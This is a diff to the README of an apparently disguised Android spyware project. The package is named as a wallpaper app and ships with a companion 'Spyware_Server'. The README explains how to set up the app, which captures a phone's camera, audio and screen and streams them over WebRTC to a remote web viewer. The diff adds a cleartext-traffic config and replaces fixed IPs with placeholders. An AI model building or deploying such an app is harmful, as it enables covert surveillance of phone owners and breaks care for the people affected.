@@ -20,11 +20,13 @@ project/
 │   │   ├── src/main/java/com/example/wallpaperapplication/
 │   │   │   ├── BootReciever.java
 │   │   │   ├── ConsentActivity.java
+│   │   │   ├── Constants.java
 │   │   │   ├── SdpObserverActivity.java
 │   │   │   ├── StreamingService.java
 │   │   │   ├── StreamingSettingsActivity.java
 │   │   │   └── WallpaperAdapter.java
 │   │   ├── src/main/AndroidManifest.xml
+│   │   ├── src/main/res/xml/network_security_config.xml
 │   │   └── build.gradle
 │   ├── Android_WebRTC_Spyware_Server/
 │   │   ├── server.js
@@ -41,6 +43,7 @@ project/
 - **StreamingService.java**: Android service that initializes WebRTC, captures camera, audio, and screen, and handles signaling with the server
 - **StreamingSettingsActivity.java**: UI to toggle streaming and request permissions (camera, audio, screen capture)
 - **AndroidManifest.xml**: Declares permissions and service configuration
+- **network_security_config.xml**: Allows the Android Application to send cleartext traffic to the Web Server.
 - **server.js**: Node.js server using Express and Socket.IO for signaling between Android and web clients
 - **index.html**: Web interface displaying camera (remoteVideo) and screen (screenVideo) streams
 - **client.js**: JavaScript for WebRTC peer connection, track handling, and signaling on the web client
@@ -64,7 +67,7 @@ project/
 
 ### Network
 - Devices must be on the same network (e.g., Wi-Fi) or reachable via TURN server
-- Server IP: 192.168.29.10 (update if different)
+- Server IP: 192.178.2.10 (update if different)
 
 ## Setup Instructions
 
@@ -101,9 +104,13 @@ ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
 
 #### Update Signaling URL (if needed)
 In `StreamingService.java`, ensure `SIGNALING_URL` matches your server's IP:
-
 ```java
-private static final String SIGNALING_URL = "http://192.168.29.10:3000";
+private static final String SIGNALING_URL = "http://<Input your WebRTC Server IP>:3000";
+```
+
+In `network_security_config.xml`, ensure that `<domain>` matches your server's IP:
+```xml
+<domain includeSubdomains="true">Input your WebRTC Server IP</domain>
 ```
 
 #### Permissions in `AndroidManifest.xml`
@@ -145,7 +152,7 @@ const config = {
 In `client.js`, ensure the Socket.IO URL matches the server:
 
 ```javascript
-const socket = io('http://192.168.29.10:3000');
+const socket = io('http://<Input your WebRTC Server IP>:3000');
 ```
 
 ### 4. Run the Server
@@ -175,7 +182,7 @@ Run the app on a physical Android device or emulator (API 21+).
 ### 6. Access the Web Interface
 
 #### Open Browser
-On a computer or device on the same network, open `http://192.168.29.10:3000` in Chrome or Firefox.
+On a computer or device on the same network, open `http://<Input your WebRTC Server IP>:3000` in Chrome or Firefox.
 
 #### Expected Output
 - `<video id="remoteVideo">`: Displays the Android camera stream with audio
@@ -266,7 +273,7 @@ When seeking support, provide:
    - Camera: mid=video
    - Screen: mid=screen
    - Audio: mid=audio
-5. Uses Socket.IO to connect to the signaling server (http://192.168.29.10:3000)
+5. Uses Socket.IO to connect to the signaling server (http://<WebRTC Server IP Address>:3000)
 6. Waits for web-client-ready, then sends a WebRTC offer with all tracks after screen capture is ready
 7. Handles ICE candidates and answers from the web client
 
